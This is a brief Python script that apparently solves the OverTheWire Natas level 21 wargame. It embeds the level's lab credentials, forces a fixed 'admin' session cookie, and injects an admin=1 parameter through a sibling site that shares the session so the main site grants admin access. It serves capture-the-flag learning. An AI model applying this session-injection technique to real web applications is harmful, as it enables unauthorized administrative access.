import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

url1 = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1"


def send_request(url) -> str:
    cookie = "PHPSESSID=" + "admin"

    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url2 + "&submit=1&admin=1")
    print(text)
    text = send_request(url1)
    print(text)
